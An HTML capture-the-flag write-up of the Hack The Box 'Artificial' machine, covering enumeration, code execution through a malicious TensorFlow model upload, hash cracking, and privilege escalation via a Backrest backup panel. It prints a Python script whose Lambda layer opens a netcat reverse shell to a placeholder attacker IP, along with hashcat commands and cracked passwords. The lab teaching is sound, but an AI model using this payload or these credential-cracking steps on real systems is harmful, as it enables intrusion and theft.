<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTB Write-up: Artificial | A Professional Walkthrough</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/phosphor-icons"></script>
    <style>
        /* === BASE STYLES & TYPOGRAPHY === */
        body {
            font-family: 'Source Sans Pro', sans-serif;
            background-color: #0A0C10;
            color: #E6EDF3;
        }
        .container-main {
            max-width: 80rem;
            margin: 0 auto;
        }
        .font-mono {
            font-family: 'Roboto Mono', monospace;
        }
        p {
            line-height: 1.75;
            color: #bdc5d0;
            margin-bottom: 1rem;
        }

        /* === HEADINGS === */
        h1, h2, h3 {
            color: #ffffff;
            font-weight: 700;
        }
        h2 {
            font-size: 2rem;
            padding-bottom: 0.75rem;
            margin-top: 3rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            border-bottom: 2px solid;
            border-image: linear-gradient(to right, #388BFD, #0A0C10) 1;
        }
        h3 {
            font-size: 1.5rem;
            margin-top: 2.5rem;
            margin-bottom: 1rem;
            color: #58a6ff;
        }

        /* === CODE BLOCKS === */
        .code-block {
            background-color: #161B22;
            border: 1px solid #30363d;
            border-radius: 0.5rem;
            margin: 1.5rem 0;
            box-shadow: 0 4px 14px 0 rgba(0,0,0,0.3);
            overflow: hidden; /* To keep header and pre contained */
        }
        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #21262D;
            padding: 0.5rem 1rem;
            border-bottom: 1px solid #30363d;
        }
        .code-header span {
            font-family: 'Roboto Mono', monospace;
            font-size: 0.8rem;
            color: #8D96A0;
            text-transform: uppercase;
        }
        .code-block pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 0.9em;
            padding: 1.25rem;
            color: #E6EDF3;
        }
        .copy-btn {
            background-color: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
            padding: 0.25rem 0.75rem;
            border-radius: 0.375rem;
            cursor: pointer;
            font-size: 0.75rem;
            opacity: 0.7;
            transition: all 0.2s ease-in-out;
        }
        .copy-btn:hover {
            opacity: 1;
            background-color: #30363d;
        }
        
        /* === IMAGES & NOTES === */
        img {
            border-radius: 0.5rem;
            margin: 2rem auto;
            border: 1px solid #30363d;
            display: block;
        }
        .caption {
            font-size: 0.875rem;
            color: #8D96A0;
            text-align: center;
            margin-bottom: 1.5rem;
            margin-top: -1.5rem;
        }
        .note {
            padding: 1.25rem;
            margin: 1.5rem 0;
            border-radius: 0.375rem;
            border-left-width: 4px;
        }
        .note-info {
            background-color: rgba(45, 164, 78, 0.15);
            border-left-color: #2DA44E;
        }
        .note-warn {
             background-color: rgba(210, 153, 34, 0.15);
            border-left-color: #D29922;
        }
        .note strong {
            color: #E6EDF3;
        }
        .note code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 0.2rem 0.4rem;
            border-radius: 0.2rem;
        }

        /* === TABLE OF CONTENTS (ASIDE) === */
        #toc {
            position: sticky;
            top: 2rem;
        }
        #toc a {
            color: #8D96A0;
            transition: all 0.2s ease-in-out;
            border-left: 2px solid #30363d;
        }
        #toc a:hover, #toc a.active {
            color: #58a6ff;
            transform: translateX(4px);
            border-left-color: #58a6ff;
        }
        
        /* === FLAG & MODAL STYLES === */
        .flag-container {
            border: 1px dashed #30363d;
            border-radius: 0.5rem;
            padding: 1.5rem;
            text-align: center;
            margin: 2rem 0;
        }
        .flag-btn {
            background-color: #388BFD;
            color: white;
            padding: 0.5rem 1.5rem;
            border-radius: 0.375rem;
            cursor: pointer;
            transition: background-color 0.2s;
            border: none;
            font-weight: 600;
        }
        .flag-btn:hover {
            background-color: #58a6ff;
        }
        .flag-content {
            display: none; /* Hidden by default */
        }
        #password-modal-overlay {
            transition: opacity 0.3s ease;
        }
    </style>
</head>
<body class="p-4 sm:p-6 lg:p-8">

    <div class="container-main grid grid-cols-12 gap-8">
        <!-- Table of Contents -->
        <aside class="hidden lg:block col-span-3">
            <nav id="toc" class="space-y-3 pt-4">
                <h3 class="font-bold text-white text-lg mb-4">Table of Contents</h3>
                <a href="#introduction" class="block p-2 pl-4">Introduction</a>
                <a href="#attack-flow" class="block p-2 pl-4">Attack Flowchart</a>
                <a href="#enumeration" class="block p-2 pl-4">1. Enumeration</a>
                <a href="#initial-foothold" class="block p-2 pl-4">2. Initial Foothold</a>
                <a href="#privesc" class="block p-2 pl-4">3. Privilege Escalation</a>
                <a href="#conclusion" class="block p-2 pl-4">4. Conclusion</a>
            </nav>
        </aside>

        <!-- Main Content -->
        <div class="col-span-12 lg:col-span-9">
            <header class="text-center py-16 rounded-lg bg-gradient-to-b from-[#161B22] to-[#0A0C10] border border-[#30363d] mb-12">
                <img src="cropped_circle_image.png" alt="Artificial Machine Logo" class="h-24 w-24 mx-auto mb-4 border-0 rounded-full">
                <h1 class="text-5xl font-bold text-white">HTB Write-up: Artificial</h1>
                <p class="text-xl text-gray-400 mt-4">by Keshav Kacholiya</p>
                <div class="flex justify-center gap-4 mt-4">
                    <span class="bg-green-500/20 text-green-300 text-sm font-semibold px-3 py-1 rounded-full">Difficulty: Easy</span>
                    <span class="bg-blue-500/20 text-blue-300 text-sm font-semibold px-3 py-1 rounded-full">OS: Linux</span>
                </div>
            </header>

            <main>
                 <section id="introduction">
                    <h2><i class="ph-info"></i>Introduction</h2>
                    <p>This report provides a detailed, step-by-step walkthrough for the "Artificial" machine on Hack The Box. This easy-rated Linux box features a two-stage exploitation path: initial access is gained via a code execution vulnerability in a TensorFlow model upload feature, and privileges are escalated by exploiting a misconfigured backup service. This write-up covers every step from initial scanning to capturing the root flag, supported by screenshots for clarity.</p>
                </section>
                
                <section id="attack-flow">
                    <h2><i class="ph-tree-structure"></i>Attack Flowchart</h2>
                    <div class="code-block font-mono text-sm">
                        <div class="code-header"><span>ATTACK PATH</span></div>
                        <pre>
[Start]
   |
   v
[Enumeration] -> (Nmap, Gobuster) -> Discovered Ports 22 (SSH), 80 (HTTP) & Webpages /login, /register
   |
   v
[Initial Foothold] -> RCE via Malicious .h5 TensorFlow Model Upload
   |
   v
[Shell as 'app'] -> Found users.db -> Cracked 'gael' Password
   |
   v
[Lateral Movement] -> SSH as 'gael' -> Captured user.txt
   |
   v
[Privilege Escalation] -> Found backrest_backup.tar.gz -> Exfiltrated & Extracted
   |
   v
[Cracked Credentials] -> Found bcrypt hash in config.json -> Cracked 'backrest_root' Password
   |
   v
[Pivot to Service] -> Port forward 127.0.0.1:9898 -> Login to Backrest Panel
   |
   v
[Root Access] -> Used Backrest to Restore & Download /root/root.txt
   |
   v
[End]
                        </pre>
                    </div>
                </section>

                <section id="enumeration">
                    <h2><i class="ph-magnifying-glass"></i>1. Enumeration</h2>
                    <p>The first step in any penetration test is to enumerate the target to understand its attack surface.</p>
                    <h3>Nmap Scan</h3>
                    <p>A port scan using Nmap reveals the open ports and services running on the machine.</p>
                    <div class="code-block">
                        <div class="code-header">
                            <span>BASH</span>
                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                        </div>
                        <pre><code class="language-bash">nmap -sC -sV artificial.htb</code></pre>
                    </div>
                    <img src="nmap.png" alt="Nmap Scan Results">
                    <p class="caption">Nmap scan showing open ports 22 (SSH) and 80 (HTTP/nginx).</p>

                    <h3>Web Enumeration with Gobuster</h3>
                    <p>With a web server on port 80, directory brute-forcing is performed to find hidden pages or directories.</p>
                    <div class="code-block">
                        <div class="code-header">
                            <span>BASH</span>
                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                        </div>
                        <pre><code class="language-bash">gobuster dir -u http://artificial.htb -w /usr/share/wordlists/dirb/common.txt -t 50</code></pre>
                    </div>
                    <img src="gobuster.png" alt="Gobuster Scan Results">
                    <p class="caption">Gobuster scan revealing /login, /register, and /dashboard endpoints.</p>
                </section>

                <section id="initial-foothold">
                    <h2><i class="ph-key"></i>2. Initial Foothold: RCE via TensorFlow</h2>
                    <p>After registering an account, we land on a dashboard that allows uploading AI models. The page mentions TensorFlow and provides a Dockerfile, which is a strong hint about the intended attack vector.</p>
                    <img src="website.png" alt="Website Dashboard">
                    <p class="caption">The dashboard for uploading AI models.</p>
                    
                    <h3>Crafting the Payload</h3>
                    <p>The vulnerability lies in how TensorFlow handles serialized model files (`.h5`). It's possible to embed a Lambda layer with arbitrary Python code that executes upon model processing. A Python script is created to generate a malicious model containing a reverse shell payload.</p>
                    <div class="code-block">
                        <div class="code-header">
                            <span>Python</span>
                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                        </div>
                        <pre><code class="language-python">import tensorflow as tf
import os

def exploit(x):
    # Reverse shell payload
    os.system("rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_ATTACKER_IP 4444 >/tmp/f")
    return x

model = tf.keras.Sequential([
    tf.keras.layers.Input(shape=(64,)),
    tf.keras.layers.Lambda(exploit)
])
model.compile()
model.save("exploit.h5")</code></pre>
                    </div>
                    
                    <h3>Building and Executing the Payload</h3>
                    <p>The provided Dockerfile is used to create a container with the necessary environment to build the malicious model.</p>
                    <img src="docker start.png" alt="Starting Docker Container">
                    <p class="caption">Entering the Docker container to build the payload.</p>
                    <p>Inside the container, the Python script is run, generating the `exploit.h5` file.</p>
                    <img src="exploit_h5.png" alt="Generating exploit.h5">
                    <p class="caption">The malicious `exploit.h5` model is created.</p>
                    
                    <div class="note note-info">
                        <p><strong>Heads Up:</strong> A Netcat listener (<code>nc -lnvp 4444</code>) must be running on the attacker machine to catch the reverse shell when the model is uploaded and processed.</p>
                    </div>
                    <p>The `exploit.h5` file is uploaded via the web UI. Clicking the "View Prediction" button triggers the payload, and a reverse shell is received.</p>
                    <img src="nc lsitening.png" alt="Netcat Listener Receiving Shell">
                    <p class="caption">Success! A reverse shell connection as the 'app' user.</p>

                    <h3>Gaining User Access</h3>
                    <p>As the `app` user, a local database file at `/home/app/app/instance/users.db` is found containing user credentials. The MD5 hash for the user `gael` is extracted and cracked.</p>
                    <img src="password cracker.png" alt="Cracking Gael's Password">
                    <p class="caption">The cracked password for user 'gael' is 'watterson'.</p>
                    <p>With the credentials, we can SSH into the machine as `gael` for a stable shell and capture the user flag.</p>
                    <div class="flag-container">
                        <button class="flag-btn" onclick="openPasswordModal(this)">Show User Flag</button>
                        <div class="flag-content">
                            <img src="user flag.png" alt="Capturing the User Flag">
                            <p class="caption">Logged in as gael and captured the user flag.</p>
                        </div>
                    </div>
                </section>

                <section id="privesc">
                    <h2><i class="ph-arrow-fat-up"></i>3. Privilege Escalation: Abusing Backrest Backup</h2>
                    <h3>Internal Enumeration & Exfiltration</h3>
                    <p>As `gael`, enumeration reveals a backup archive at `/var/backups/backrest_backup.tar.gz`. This file is exfiltrated to the attacker machine for analysis.</p>
                    <img src="backrest-backup file.png" alt="Finding the Backup File">
                    <p class="caption">Discovering the backup archive and transferring it via scp.</p>

                    <h3>Exfiltrating and Cracking Credentials</h3>
                    <p>After extracting the archive, a configuration file `backrest/.config/backrest/config.json` is found. It contains a Base64-encoded bcrypt hash for the user `backrest_root`.</p>
                    <img src="cat.json.png" alt="Contents of config.json">
                    <p class="caption">The config file containing the encoded password hash.</p>
                    <p>The hash is decoded and then cracked using Hashcat.</p>
                    <div class="code-block">
                        <div class="code-header">
                            <span>BASH</span>
                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
                        </div>
                        <pre><code class="language-bash"># Decode from Base64
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > /tmp/bcrypt.hash

# Crack with Hashcat
hashcat -m 3200 /tmp/bcrypt.hash /usr/share/wordlists/rockyou.txt</code></pre>
                    </div>
                    <img src="hashcat localhost.png" alt="Cracking the Bcrypt Hash">
                    <p class="caption">Hashcat reveals the password: `!@#$%^`</p>

                    <h3>Capturing the Root Flag via Backrest</h3>
                    <p>The cracked credentials belong to an internal web service, Backrest, running on port 9898.</p>
                    <div class="note note-warn">
                      <p><strong>Pivoting:</strong> Use SSH local port forwarding to access the internal web service: <code>ssh -L 9898:127.0.0.1:9898 gael@artificial.htb</code></p>
                    </div>
                    <p>After logging into the Backrest panel, the root flag can be obtained by manipulating the backup and restore functionality. The process involves creating a repository and a plan to restore the <code>/root/root.txt</code> file.</p>
                    
                    <p><strong>Step 1: Set up the Repository</strong><br>First, a new Restic repository is configured in the Backrest UI. This acts as a destination for backup operations.</p>
                    <img src="9898-1.png" alt="Backrest Repo Setup">
                    <p class="caption">A new repository named 'repo1' is created.</p>
                    
                    <p><strong>Step 2: Create a Backup Plan</strong><br>Next, a backup plan is created. This plan defines what to back up and where to store it, linking to the repository created in the previous step.</p>
                    <img src="9898-2.png" alt="Backrest Plan View">
                    <p class="caption">The 'plan1' is created and linked to our repository.</p>
                    
                    <p><strong>Step 3: Run the Backup and View Snapshot</strong><br>The plan is executed to create a snapshot. We can then inspect the details of this snapshot, which will contain the files from the specified backup path.</p>
                    <img src="9898-3.png" alt="Backrest Backup Details">
                    <p class="caption">The backup job completes, creating a new snapshot.</p>
                    
                    <p><strong>Step 4: Find root.txt in the Snapshot Browser</strong><br>Using the Snapshot Browser, we can navigate the file system of the backup and locate the target file, `/root/root.txt`.</p>
                    <img src="9898-4.png" alt="Backrest Snapshot Browser">
                    <p class="caption">The root flag is located within the backup snapshot.</p>

                    <p><strong>Step 5: Initiate the Restore Process</strong><br>With the file selected, the restore process is initiated. We specify a path where the restored file will be placed.</p>
                    <img src="9898-5.png" alt="Backrest Restore Modal">
                    <p class="caption">The restore operation for root.txt is confirmed.</p>
                    
                    <p><strong>Step 6: Download the Restored File</strong><br>Once the restore job is finished, the Backrest UI provides a direct link to download the restored file, giving us the contents of `root.txt`.</p>
                    <img src="9898-6.png" alt="Backrest Restored File">
                    <p class="caption">The restore is complete, and a download link is available.</p>
                    
                    <p>Clicking the download link provides the contents of the root flag.</p>
                    <div class="flag-container">
                        <button class="flag-btn" onclick="openPasswordModal(this)">Show Root Flag</button>
                        <div class="flag-content">
                            <img src="9898-7.png" alt="Root Flag Captured" class="max-w-xl mx-auto">
                            <p class="caption">BOOM! The root flag is downloaded and captured.</p>
                        </div>
                    </div>
                </section>
                
                <section id="conclusion">
                    <h2><i class="ph-flag-checkered"></i>4. Conclusion</h2>
                    <p>The "Artificial" machine highlighted two key vulnerabilities. Initial access was gained via <strong>Arbitrary Code Execution</strong> through an improperly sanitized TensorFlow model upload. Privilege escalation was achieved by exploiting a <strong>Misconfigured Backup Service</strong> that exposed sensitive credentials and allowed arbitrary file restoration. This machine serves as an excellent reminder to validate all user-supplied files and to properly secure backup configurations and data.</p>
                    <img src="victory.png" alt="Artificial has been Pwned!" class="max-w-2xl mx-auto">
                    <p class="caption">Machine successfully compromised.</p>
                </section>
            </main>

            <footer class="text-center py-8 mt-12 border-t border-[#30363d]">
                <p class="text-[#8b949e]">Write-up by Keshav Kacholiya (DoodleX007) | September 25, 2025</p>
            </footer>
        </div>
    </div>
    
    <!-- Password Modal -->
    <div id="password-modal-overlay" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50">
        <div id="password-modal" class="bg-[#161B22] border border-[#30363d] p-8 rounded-lg shadow-xl w-full max-w-sm">
            <h3 class="text-xl font-bold text-white mb-4">Enter Password</h3>
            <p class="text-[#8D96A0] mb-6">Enter the password to reveal the flag.</p>
            <input type="password" id="password-input" class="w-full bg-[#0A0C10] border border-[#30363d] rounded-md px-3 py-2 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#388BFD]">
            <p id="password-error" class="text-red-500 text-sm mt-2 hidden">Incorrect password. Please try again.</p>
            <div class="mt-6 flex justify-end gap-4">
                <button onclick="closePasswordModal()" class="bg-transparent border border-[#30363d] text-gray-300 px-4 py-2 rounded-md hover:bg-[#30363d] transition">Cancel</button>
                <button onclick="checkPassword()" class="bg-[#388BFD] text-white px-4 py-2 rounded-md hover:bg-[#58a6ff] transition">Submit</button>
            </div>
        </div>
    </div>

    <script>
        function copyCode(button) {
            const pre = button.parentElement.nextElementSibling;
            const code = pre.innerText;
            navigator.clipboard.writeText(code).then(() => {
                button.innerHTML = '<i class="ph-check"></i> Copied!';
                setTimeout(() => {
                    button.innerHTML = 'Copy';
                }, 2000);
            }).catch(err => {
                console.error('Failed to copy: ', err);
            });
        }
        
        let currentFlagButton = null;

        function openPasswordModal(button) {
            currentFlagButton = button;
            const modalOverlay = document.getElementById('password-modal-overlay');
            modalOverlay.classList.remove('hidden');
            modalOverlay.classList.add('flex');
            document.getElementById('password-input').focus();
            document.getElementById('password-error').classList.add('hidden');
        }

        function closePasswordModal() {
            const modalOverlay = document.getElementById('password-modal-overlay');
            modalOverlay.classList.add('hidden');
            modalOverlay.classList.remove('flex');
            document.getElementById('password-input').value = '';
            currentFlagButton = null;
        }

        function checkPassword() {
            const input = document.getElementById('password-input');
            const errorMsg = document.getElementById('password-error');
            if (input.value === 'doodle') {
                if (currentFlagButton) {
                    showFlag(currentFlagButton);
                }
                closePasswordModal();
            } else {
                errorMsg.classList.remove('hidden');
            }
        }
        
        document.getElementById('password-input').addEventListener('keyup', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                checkPassword();
            }
        });
        
        function showFlag(button) {
            const container = button.parentElement;
            const flagContent = container.querySelector('.flag-content');
            button.style.display = 'none';
            flagContent.style.display = 'block';
        }

        // Active TOC link scrolling
        const sections = document.querySelectorAll('main section');
        const navLinks = document.querySelectorAll('#toc a');

        window.onscroll = () => {
            let current = '';
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                if(pageYOffset >= sectionTop - 60) {
                    current = section.getAttribute('id');
                }
            });

            navLinks.forEach(a => {
                a.classList.remove('active');
                if(a.getAttribute('href').includes(current)) {
                    a.classList.add('active');
                }
            })
        }
    </script>
</body>
</html>

